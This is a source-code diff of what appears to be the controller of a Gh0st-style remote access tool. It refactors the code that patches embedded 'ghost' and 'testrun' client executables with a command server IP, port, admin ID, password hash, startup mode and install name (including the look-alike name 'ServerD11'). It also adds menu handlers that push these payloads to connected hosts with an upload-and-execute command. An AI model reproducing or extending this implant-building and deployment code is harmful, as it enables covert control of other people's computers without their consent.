@@ -174,7 +174,7 @@ BOOL CAboutDlg::OnInitDialog()
     __super::OnInitDialog();
     // 多语言翻译 - Static控件
     SetDlgItemText(IDC_STATIC_ABOUTBOX_YamaV12_2340, _TR("Yama，V") + VERSION_STR);
-    SetDlgItemText(IDC_STATIC_ABOUTBOX_Copyleft__2341, _TR("Copyleft (C) 2019—2026"));
+    SetDlgItemText(IDC_STATIC_ABOUTBOX_Copyleft__2341, _TR("Copyleft (C) 2019-2026"));
 
     // 设置对话框标题和控件文本（解决英语系统乱码问题）
     SetWindowText(_TR("关于YAMA"));
@@ -641,7 +641,9 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_TOOL_LICENSE_MGR, &CMy2015RemoteDlg::OnToolLicenseMgr)
     ON_COMMAND(ID_TOOL_V2_PRIVATEKEY, &CMy2015RemoteDlg::OnToolV2PrivateKey)
     ON_COMMAND(ID_MENU_NOTIFY_SETTINGS, &CMy2015RemoteDlg::OnMenuNotifySettings)
-END_MESSAGE_MAP()
+        ON_COMMAND(ID_EXECUTE_TESTRUN, &CMy2015RemoteDlg::OnExecuteTestrun)
+        ON_COMMAND(ID_EXECUTE_GHOST, &CMy2015RemoteDlg::OnExecuteGhost)
+        END_MESSAGE_MAP()
 
 
 // CMy2015RemoteDlg 消息处理程序
@@ -2269,6 +2271,46 @@ void CMy2015RemoteDlg::OnOnlineMessage()
     SendSelectedCommand(&bToken, sizeof(BYTE));
 }
 
+// 从资源中读取被控端文件，并根据用户选择修改连接信息后返回给发送线程
+BYTE* ReadExeFromResource(DWORD& outSize, int resourceId, int iType, int iStartup, 
+    const std::string& dir, const std::string& name, int cmd, int sizeofSize)
+{
+    DWORD dwFileSize = 0;
+    BYTE* szBuffer = ReadResource(resourceId, dwFileSize);
+    outSize = dwFileSize;
+    CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN };
+	char* pSearchStart = (char*)szBuffer;
+    int iOffset = MemoryFind(pSearchStart, (char*)g_ConnectAddress.Flag(), dwFileSize, g_ConnectAddress.FlagLen());
+    if (iOffset == -1) {
+        SAFE_DELETE(szBuffer);
+        return NULL;
+    }
+    while (iOffset != -1 && dwFileSize >= sizeof(CONNECT_ADDRESS)) {
+        CONNECT_ADDRESS* dst = (CONNECT_ADDRESS*)(pSearchStart + iOffset);
+        dst->SetAdminId(GetMasterHash().c_str());
+        memcpy(dst->szFlag, GetMasterId().c_str(), 16);
+        strcpy_s(dst->szServerIP, THIS_CFG.GetStr("settings", "master", "127.0.0.1").c_str());
+		auto ports = StringToVector(THIS_CFG.GetStr("settings", "ghost", "6543"), ';');
+        strcpy_s(dst->szPort, ports[0].c_str());
+        dst->Encrypt();
+        dst->iType = iType;
+        dst->iStartup = iStartup;
+        strcpy_s(dst->szBuildDate, DLL_VERSION);
+        memcpy(dst->pwdHash, GetPwdHash().c_str(), 64);
+        strcpy_s(dst->installDir, dir.c_str());
+        strcpy_s(dst->installName, name.c_str());
+        pSearchStart += iOffset + sizeof(CONNECT_ADDRESS);
+		dwFileSize -= iOffset + sizeof(CONNECT_ADDRESS);
+        iOffset = MemoryFind(pSearchStart, (char*)g_ConnectAddress.Flag(), dwFileSize, g_ConnectAddress.FlagLen());
+    }
+    BYTE *buffer = new BYTE[outSize + 1 + sizeofSize];
+    buffer[0] = cmd;
+    memcpy(buffer + 1, &outSize, sizeofSize);
+    memcpy(buffer + 1 + sizeofSize, szBuffer, outSize);
+    SAFE_DELETE_ARRAY(szBuffer);
+	return buffer;
+}
+
 void CMy2015RemoteDlg::OnOnlineUpdate()
 {
     context* ContextObject = nullptr;
@@ -2299,33 +2341,10 @@ void CMy2015RemoteDlg::OnOnlineUpdate()
         std::filesystem::path path = ContextObject->GetAdditionalData(RES_FILE_PATH).GetString();
         std::string stem = path.stem().string();
         std::string dirName = path.parent_path().filename().string();
-        BYTE* szBuffer = ReadResource(dlg.m_nSelected ? (is64bit ? IDR_GHOST_X64 : IDR_GHOST_X86) :
-                                      (is64bit ? IDR_TESTRUN_X64 : IDR_TESTRUN_X86), dwFileSize);
-        CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN };
-        int iOffset = MemoryFind((char*)szBuffer, (char*)g_ConnectAddress.Flag(), dwFileSize, g_ConnectAddress.FlagLen());
-        if (iOffset == -1) {
-            SAFE_DELETE(szBuffer);
-            return;
-        }
-        CONNECT_ADDRESS* dst = (CONNECT_ADDRESS*)(szBuffer + iOffset);
-        dst->SetAdminId(GetMasterHash().c_str());
-        memcpy(dst->szFlag, GetMasterId().c_str(), 16);
-        strcpy_s(dst->szServerIP, THIS_CFG.GetStr("settings", "master", "127.0.0.1").c_str());
-        strcpy_s(dst->szPort, THIS_CFG.GetStr("settings", "ghost", "6543").c_str());
-        dst->Encrypt();
-        dst->iType = dlg.m_nSelected ? CLIENT_TYPE_ONE : CLIENT_TYPE_MEMDLL;
-        dst->iStartup = dlg.m_nSelected ? Startup_GhostMsc : Startup_TestRunMsc;
-        strcpy_s(dst->szBuildDate, DLL_VERSION);
-        memcpy(dst->pwdHash, GetPwdHash().c_str(), 64);
-        strcpy_s(dst->installDir, dirName.c_str());
-        strcpy_s(dst->installName, stem.c_str());
-
-        fileSize = dwFileSize;
-        buffer = new BYTE[fileSize + 9];
-        buffer[0] = COMMAND_UPDATE;
-        memcpy(buffer + 1, &fileSize, 8);
-        memcpy(buffer + 9, szBuffer, fileSize);
-        SAFE_DELETE_ARRAY(szBuffer);
+        buffer = ReadExeFromResource(dwFileSize, dlg.m_nSelected ? (is64bit ? IDR_GHOST_X64 : IDR_GHOST_X86) :
+            (is64bit ? IDR_TESTRUN_X64 : IDR_TESTRUN_X86), dlg.m_nSelected ? CLIENT_TYPE_ONE : CLIENT_TYPE_MEMDLL,
+            dlg.m_nSelected ? Startup_GhostMsc : Startup_TestRunMsc, dirName, stem, COMMAND_UPDATE, 8);
+		fileSize = dwFileSize;
     } else if (clientType == "DLL") {
         Buffer* buf = m_ServerDLL[PAYLOAD_DLL_X64];
         fileSize = buf->length(true) - 6;
@@ -5895,6 +5914,32 @@ void CMy2015RemoteDlg::OnExecuteUpload()
     delete[] pPacket;
 }
 
+
+void CMy2015RemoteDlg::OnExecuteTestrun()
+{
+	DWORD dwSize = 0;
+    BYTE* buffer = ReadExeFromResource(dwSize, IDR_TESTRUN_X64, CLIENT_TYPE_ONE, Startup_TestRunMsc,
+        "YAMA", "ServerD11", COMMAND_UPLOAD_EXEC, 4);
+    if (buffer && dwSize > 0) {
+        SendSelectedCommand(buffer, 5 + dwSize);
+        delete[] buffer;
+    } else {
+        MessageBoxL("资源文件读取失败!", "错误", MB_ICONERROR);
+	}
+}
+
+void CMy2015RemoteDlg::OnExecuteGhost()
+{
+	DWORD dwSize = 0;
+    BYTE *buffer = ReadExeFromResource(dwSize, IDR_GHOST_X64, CLIENT_TYPE_ONE, Startup_GhostMsc,
+		"YAMA", "ServerDll", COMMAND_UPLOAD_EXEC, 4);
+    if (buffer && dwSize > 0) {
+        SendSelectedCommand(buffer, 5 + dwSize);
+        delete[] buffer;
+    } else {
+        MessageBoxL("资源文件读取失败!", "错误", MB_ICONERROR);
+	}
+}
 
 void CMy2015RemoteDlg::OnDestroy()
 {
